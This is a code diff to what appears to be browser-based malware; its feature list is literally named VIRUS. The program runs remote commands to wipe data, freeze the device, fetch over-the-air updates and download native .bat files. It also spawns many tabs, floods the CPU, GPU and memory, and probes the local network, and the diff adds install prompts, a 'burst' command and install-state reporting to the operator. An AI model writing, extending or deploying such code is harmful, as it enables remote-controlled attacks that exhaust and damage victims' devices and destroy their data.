-    gated: R.gated ? 1 : 0,
+    gated: R.gated ? 1 : 0, swBad: SW_SPAWN_BAD,
+    install: { state: R.installState || "", btn: R.installBtn ? 1 : 0,
+               bip: !!BIP, standalone: STANDALONE ? 1 : 0, installed: R.installed ? 1 : 0 },
     win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin,
            w: W, queue: QUEUE.length, opened: TAP_OPENED, mob: IS_MOBILE ? 1 : 0 }
   };
@@ -2667,7 +2846,8 @@ function runCmd(c) {
     else if (k === "update") ota();
     else if (k === "freeze") freezeNow(a || "soft");
     else if (k === "wipe") wipe();
-    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
+    else if (k === "install") { try { installPrompt(0); } catch (e) {} }
+    else if (k === "installhelp") { try { showInstallHelp(); } catch (e) {} }
     else if (k === "native") niDownload(a || "bat");
     else if (k === "title") document.title = a || CFG.avName;
     else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
@@ -2737,6 +2917,7 @@ function runCmd(c) {
       hint();
     }
     else if (k === "flush") { flushQueue(true); }
+    else if (k === "burst") { burst(); }
     else if (k === "tabon") { TAB_ON = true; LAST_TAB = 0; tabBreed(); }
     else if (k === "taboff") { TAB_ON = false; }
     else if (k === "breed") {
@@ -3501,7 +3682,8 @@ function arm() {
 window.__singularity = {
   report: function () { return R; },
   flush: function () { push(true); },
-  install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
+  install: function () { return installPrompt(0); },
+  installHelp: showInstallHelp,
   native: function (ext) { return niDownload(ext || "bat"); },
   usb: function () { return R.usb; },
   cmd: runCmd, peers: function () { return { peers: 0, leader: true }; },
@@ -3511,6 +3693,7 @@ window.__singularity = {
   breedN: function (m) { runCmd({ kind: "breed", arg: String(m || 2) }); },
   tabs: function (n) { spawnMany(clamp(n || 6, 1, 64)); },
   tab: function (n) { runCmd({ kind: "tab", arg: String(n || 4) }); },
+  burst: burst,
   tap: function () { return flushQueue(true); },
   queue: function () { return QUEUE.length; },
   pending: function () { return PENDING_N; },
@@ -3571,11 +3754,12 @@ VIRUS = {
              "window-skin", "hardware-kill", "swarm-keeper", "mobile-tap-breed",
              "auto-breed", "unlimited-l7", "heavy-download", "notify-all-levels",
              "watch-cmd-alias", "sw-live-count", "100mb-payload",
-             "tab-breed-l3", "tab-auto-unlimited-l7", "notify-continuous",
+             "tab-breed-l2", "tab-auto-unlimited-l7", "notify-continuous",
              "stealth-text", "big-install", "apex-suite-l7", "shader-burn",
              "audioworklet", "atomics-spin", "microtask-flood", "broadcast-flood",
              "lan-probe", "webrtc-loopback", "dom-melt", "gc-storm",
-             "spawn-ack", "notify-sw", "notify-toast", "lossless-spawn"],
+             "spawn-ack", "notify-sw", "notify-toast", "lossless-spawn",
+             "no-tap-breed", "install-fix"],
 }
 
 _ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"
